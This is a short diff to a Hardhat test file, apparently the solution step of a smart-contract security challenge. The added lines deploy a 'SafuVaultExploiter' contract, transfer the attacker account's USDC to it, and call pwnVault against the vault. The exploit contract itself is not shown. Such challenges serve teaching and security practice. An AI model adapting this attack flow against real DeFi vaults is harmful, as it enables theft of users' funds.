@@ -48,7 +48,11 @@ it("solves the challenge", async function () {
 
   // implement solution here
   let pwnFactory = await ethers.getContractFactory('SafuVaultExploiter');
-  let pwner = await pwnFactory.connect(attacker).deploy(safuStrategy.address, await attacker.getAddress());
+  let pwner = await pwnFactory.connect(attacker).deploy();
+  await usdc.connect(attacker).approve(pwner.address, ethers.constants.MaxUint256)
+  await usdc.connect(attacker).transfer(pwner.address, (await usdc.balanceOf(await attacker.getAddress())))
+  
+  await pwner.connect(attacker).pwnVault(safuVault.address, usdc.address)
   
 });
 
